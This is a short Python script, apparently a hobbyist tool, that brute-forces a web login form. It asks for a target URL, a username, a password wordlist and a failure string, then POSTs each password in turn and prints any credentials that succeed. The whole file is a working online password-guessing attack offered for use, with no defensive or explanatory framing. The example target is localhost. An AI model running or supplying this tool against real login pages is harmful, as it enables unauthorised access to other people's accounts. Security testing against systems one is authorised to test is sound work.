import requests
import re
from termcolor import colored

# Function to clean HTML tags from the server response
def clean_response(response_text):
    """Remove HTML tags from the server response"""
    return re.sub(r"<.*?>", "", response_text).strip()

url = input('[+] Enter Page URL: ')                                     #(http://localhost:8000/login.php)
username = input('[+] Enter Username For The Account To Bruteforce: ')
password_file = input('[+] Enter Password File To Use: ') 
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('Enter Cookie Value(Optional): ')

# Function to perform the brute-force attack
def cracking(username, url, password_file, login_failed_string, cookie_value):
    try:
        with open(password_file, 'r', encoding="latin-1") as passwords:
            for password in passwords:
                password = password.strip()
                print(colored(f'Trying: {password}', 'red'))

                # Data to send
                data = {'username': username, 'password': password}
             
                # Send a **POST request**
                if cookie_value:
                    response = requests.post(url, data=data, cookies={'Cookie': cookie_value})
                else:
                    response = requests.post(url, data=data)

                # Clean HTML from response
                cleaned_response = clean_response(response.text)

                print(f"\n DEBUG: Sent Data → {data}")
                print(f"\n DEBUG: Cleaned Server Response → {cleaned_response}\n")



                # Check if login was successful
                if "Login Successful!" in cleaned_response:
                    print(colored(f'[+] Login Successful!', 'green'))
                    print(colored(f'[+] Found Username: {username}', 'green'))
                    print(colored(f'[+] Found Password: {password}', 'green'))
                    exit()

                # Check if the response contains the failure message
                elif login_failed_string.lower() in cleaned_response.lower():
                    pass  # Wrong password, continue brute-force
                else:
                    print(colored("[!!] Unexpected Response! Might need to update failure message.", "yellow"))
                    print(f" Server Response: {cleaned_response}")  # Show unexpected response for debugging

    except FileNotFoundError:
        print(colored("[!!] Password file not found!", "red"))
    except requests.exceptions.RequestException as e:
        print(colored(f"[!!] Network Error: {e}", "red"))

    print('[!!] Password Not In List')

# Run the attack
cracking(username, url, password_file, login_failed_string, cookie_value)
